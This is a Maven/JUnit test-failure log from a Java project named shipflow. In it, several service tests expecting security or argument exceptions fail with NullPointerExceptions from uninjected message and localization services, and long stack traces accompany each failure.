[ERROR]   CustomMetricServiceTest$GetMetricTests.shouldThrowExceptionWhenNotAuthorizedToView:366 Unexpected exception type thrown, expected: <java.lang.SecurityException> but was: <java.lang.NullPointerException>
[ERROR]   CustomMetricServiceTest$UpdateMetricTests.shouldThrowExceptionWhenMetricNotFound:238 Unexpected exception type thrown, expected: <java.lang.IllegalArgumentException> but was: <java.lang.NullPointerException>
[ERROR]   CustomMetricServiceTest$UpdateMetricTests.shouldThrowExceptionWhenNotAuthorized:253 Unexpected exception type thrown, expected: <java.lang.SecurityException> but was: <java.lang.NullPointerException>
[ERROR]   DocumentServiceTest.downloadDocument_whenFileNotFound_shouldThrowException:279 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null"
to contain:
  "File not found or not readable"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.LocalizationService.getMessage(String, Object[])" because "this.localizationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.DocumentService.downloadDocument(DocumentService.java:319)
	at com.github.farzadsedaghatbin.shipflow.service.DocumentServiceTest.lambda$1(DocumentServiceTest.java:277)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.DocumentServiceTest.downloadDocument_whenFileNotFound_shouldThrowException(DocumentServiceTest.java:277)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   MyWorkLogServiceTest.createMyWorkLog_WhenUserNotLinkedToPerson_ShouldThrowException:208 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null"
to contain:
  "not linked to a person profile"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.getCurrentUserPerson(WorkLogService.java:189)
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.createMyWorkLog(WorkLogService.java:238)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.lambda$createMyWorkLog_WhenUserNotLinkedToPerson_ShouldThrowException$0(MyWorkLogServiceTest.java:206)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.createMyWorkLog_WhenUserNotLinkedToPerson_ShouldThrowException(MyWorkLogServiceTest.java:206)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   MyWorkLogServiceTest.deleteMyWorkLog_WhenNotOwned_ShouldThrowException:266 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null"
to contain:
  "only delete your own work logs"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.deleteMyWorkLog(WorkLogService.java:326)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.lambda$deleteMyWorkLog_WhenNotOwned_ShouldThrowException$2(MyWorkLogServiceTest.java:264)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.deleteMyWorkLog_WhenNotOwned_ShouldThrowException(MyWorkLogServiceTest.java:264)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

[ERROR]   MyWorkLogServiceTest.updateMyWorkLog_WhenNotOwned_ShouldThrowException:245 
Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null"
to contain:
  "only update your own work logs"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String)" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.WorkLogService.updateMyWorkLog(WorkLogService.java:286)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.lambda$updateMyWorkLog_WhenNotOwned_ShouldThrowException$1(MyWorkLogServiceTest.java:243)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.MyWorkLogServiceTest.updateMyWorkLog_WhenNotOwned_ShouldThrowException(MyWorkLogServiceTest.java:243)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
